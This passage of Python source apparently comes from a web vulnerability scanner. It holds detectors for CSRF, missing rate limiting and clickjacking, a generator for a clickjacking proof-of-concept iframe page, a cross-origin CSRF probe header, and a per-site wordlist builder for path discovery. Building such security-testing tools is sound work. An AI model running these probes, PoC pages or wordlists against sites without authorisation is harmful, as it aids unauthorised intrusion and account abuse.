                              signals + ["request succeeded with no token and a cross-site Origin"],
                              severity="medium", payload="Origin: https://csrf-evil.example",
                              proof={"no_token": True, "cross_origin": True})
        except Exception:
            pass
    sev = "medium" if not samesite_strict else "low"
    return Result("csrf", PROBABLE, signals, severity=sev, proof={"has_token": False})


def detect_rate_limit(statuses) -> Result:
    """statuses: the list of HTTP statuses from N rapid identical auth-sensitive requests.
    Missing rate-limit when none are throttled (429/503) across a burst."""
    statuses = list(statuses or [])
    if len(statuses) < 10:
        return Result("rate-limit", SAFE, ["insufficient sample"])
    throttled = sum(1 for s in statuses if s in (429, 503))
    if throttled == 0:
        return Result("rate-limit", PROBABLE,
                      [f"no throttling across {len(statuses)} rapid requests "
                       "(brute-force / OTP / credential-stuffing exposure)"],
                      severity="medium", proof={"requests": len(statuses), "throttled": 0})
    return Result("rate-limit", SAFE, [f"throttled {throttled}/{len(statuses)}"])


def detect_clickjacking(headers: dict, *, sensitive: bool = True) -> Result:
    """Framable when neither X-Frame-Options (DENY/SAMEORIGIN) nor CSP frame-ancestors is set.
    Only material on a state-changing/sensitive page (sensitive=True)."""
    hl = {str(k).lower(): str(v).lower() for k, v in (headers or {}).items()}
    xfo = hl.get("x-frame-options", "")
    csp = hl.get("content-security-policy", "")
    protected = xfo in ("deny", "sameorigin") or "frame-ancestors" in csp
    if protected:
        return Result("clickjacking", SAFE, ["framing denied (XFO/CSP)"])
    if not sensitive:
        return Result("clickjacking", SAFE, ["framable but no sensitive action"])
    return Result("clickjacking", PROBABLE,
                  ["page is framable (no X-Frame-Options / CSP frame-ancestors) on a sensitive view"],
                  severity="low", proof={"poc": True})


def clickjacking_poc(url: str) -> str:
    return ('<!doctype html><html><body><h3>Clickjacking PoC</h3>'
            f'<iframe src="{url}" width="1000" height="700" '
            'style="opacity:0.3;position:absolute;top:0;left:0"></iframe></body></html>')


# ═══════════════════════════════════════════════════════════════════════════════
# Auto Wordlist Generator — per-site from JS/HTML/robots
# ═══════════════════════════════════════════════════════════════════════════════
_WORDLIST_BLACKLIST = {"the", "a", "an", "is", "it", "to", "of", "in", "for", "on",
                       "and", "or", "by", "with", "from", "at", "be", "this", "that",
                       "has", "have", "not", "are", "was", "were", "but", "html",
                       "body", "div", "span", "class", "style", "get", "post", "put"}


def build_site_wordlist(body: str = "", url: str = "",
                        robots_txt: str = "", sitemap_xml: str = "") -> list:
    """Build a sorted unique wordlist from site assets.

    Sources:
      - URL path segments
      - HTML/JS content (words, variable names, endpoints)
      - robots.txt disallowed paths
      - sitemap.xml URLs

    Returns a list of unique, sorted words/paths.
    """
    words = set()

    # From URL
    if url:
        pr = urlparse(url)
        for seg in pr.path.split("/"):
            seg = re.sub(r"[^a-zA-Z0-9\-_.]", "", seg)
            if seg and len(seg) > 2 and seg.lower() not in _WORDLIST_BLACKLIST:
                words.add(seg)
        # Query params
        for k, _ in parse_qsl(pr.query, keep_blank_values=True):
            k = re.sub(r"[^a-zA-Z0-9\-_]", "", k)
            if k and len(k) > 2 and k.lower() not in _WORDLIST_BLACKLIST:
                words.add(k)

    # From body (HTML/JS)
    if body:
        # JS variable/function names
        for m in re.finditer(r"(?:let|const|var|function|class)\s+(\w+)", body):
            name = m.group(1)
            if len(name) > 2 and name.lower() not in _WORDLIST_BLACKLIST:
                words.add(name)
        # API endpoints
        for m in re.finditer(r'["\'](/(?:api|v1|v2|rest|graphql|service|admin|user)[^\s"\'<>]*)["\']', body):
            ep = m.group(1).strip("/")
            for seg in ep.split("/"):
                seg = re.sub(r"[^a-zA-Z0-9\-_]", "", seg)
                if seg and len(seg) > 2 and seg.lower() not in _WORDLIST_BLACKLIST:
                    words.add(seg)
        # Object keys in JS
        for m in re.finditer(r'["\'](\w+)["\']\s*:', body):
            key = m.group(1)
            if len(key) > 2 and not key.startswith("_") and key.lower() not in _WORDLIST_BLACKLIST:
                words.add(key)
        # HTML input names
        for m in re.finditer(r'<input[^>]*name=["\'](\w+)["\']', body, re.I):
            inp = m.group(1)
            if len(inp) > 2 and inp.lower() not in _WORDLIST_BLACKLIST:
                words.add(inp)

    # From robots.txt
    if robots_txt:
        for m in re.finditer(r"(?:Disallow|Allow):\s*(/\S*)", robots_txt, re.I):
            path = m.group(1).strip("/")
            for seg in path.split("/"):
                seg = re.sub(r"[^a-zA-Z0-9\-_]", "", seg)
                if seg and len(seg) > 2 and seg.lower() not in _WORDLIST_BLACKLIST:
                    words.add(seg)

    # From sitemap.xml
    if sitemap_xml:
        for m in re.finditer(r"<loc>(.*?)</loc>", sitemap_xml, re.I):
            loc = m.group(1)
            for seg in loc.split("/"):
                seg = re.sub(r"[^a-zA-Z0-9\-_]", "", seg)
                if seg and len(seg) > 2 and seg.lower() not in _WORDLIST_BLACKLIST:
                    words.add(seg)

    return sorted(words, key=lambda x: (-len(x), x))
